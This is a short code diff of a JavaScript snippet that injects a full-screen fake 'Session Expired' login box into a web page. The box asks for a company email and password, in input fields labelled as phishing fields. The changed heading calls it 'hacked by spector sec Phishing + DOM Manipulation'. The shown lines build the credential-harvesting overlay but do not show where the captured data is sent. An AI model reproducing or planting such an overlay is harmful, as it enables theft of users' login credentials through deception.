@@ -3,7 +3,7 @@ const fakeLogin = document.createElement('div');
 fakeLogin.innerHTML = `
   <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:99999;font-family:Arial;">
     <div style="background:white;width:300px;margin:100px auto;padding:20px;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.3)">
-      <h2 style="color:#d23f00">Session Expired</h2>
+      <h2 style="color:#d23f00">Session Expired==hacked by spector sec Phishing + DOM Manipulation</h2>
       <p>Please re-authenticate to continue:</p>
       <input type="email" id="phish-email" placeholder="Company Email" style="width:100%;padding:8px;margin:5px 0;border:1px solid #ccc">
       <input type="password" id="phish-pwd" placeholder="Password" style="width:100%;padding:8px;margin:5px 0;border:1px solid #ccc">
